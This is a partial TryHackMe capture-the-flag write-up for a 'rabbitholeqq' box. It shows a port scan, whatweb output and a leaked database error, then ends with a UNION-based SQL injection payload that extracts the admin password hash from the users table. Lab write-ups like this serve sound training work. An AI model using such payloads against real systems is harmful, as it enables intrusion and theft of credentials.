---
title: "rabbitholeqq"
type: docs
tags:
  - thm
  - linux
  - hard
  - sqli
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Hard, **IP:** 10.10.0.243

</div>

<div class="callout callout-warning">

**Partial**

Recon plus the SQL-injection entry point were recorded; the remainder of the chain isn't written up here.

</div>

<div class="callout callout-abstract">

**Attack Path (recorded portion)**

1. PHP 8.3 web app on Apache, register / login flow.
2. A DB connection error leaks the schema (`mysql:host=db`, user `rabbit`).
3. **UNION-based SQL injection** in the app → extract the `admin` password hash from the `users` table.

</div>

## Reconnaissance

### Port Scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache/2.4.59 (Debian)
|   X-Powered-By: PHP/8.3.9
|   Set-Cookie: PHPSESSID=...; path=/
|_http-server-header: Apache/2.4.59 (Debian)
```

### whatweb

```console
$ whatweb http://10.10.0.243
http://10.10.0.243 [200 OK] Apache[2.4.59], Cookies[PHPSESSID], HTML5,
HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[10.10.0.243],
PHP[8.3.9], Title[Your page title here :)], X-Powered-By[PHP/8.3.9]
```

- **PHP 8.3.9**, **Apache 2.4.59 (Debian)**

## Web, SQL Injection

The app allows registration/login and echoes a login timestamp back to the page. Fuzzing the input surfaces a database error:

![Pasted image 20250525220107](Pasted-image-20250525220107.png)

```text
Fatal error: Uncaught PDOException: SQLSTATE[HY000] [2002] Connection refused
in /var/www/html/index.php:37
Stack trace: #0 /var/www/html/index.php(37): PDO->__construct('mysql:host=db;d...', 'rabbit', ...)
thrown in /var/www/html/index.php on line 37
```

→ DB host `db`, DB user **`rabbit`**.

UNION payload to pull the admin hash:

```sql
/" UNION SELECT 1,SUBSTRING((SELECT group_concat(password) FROM users WHERE username='admin'), 1, 16) -- -
```
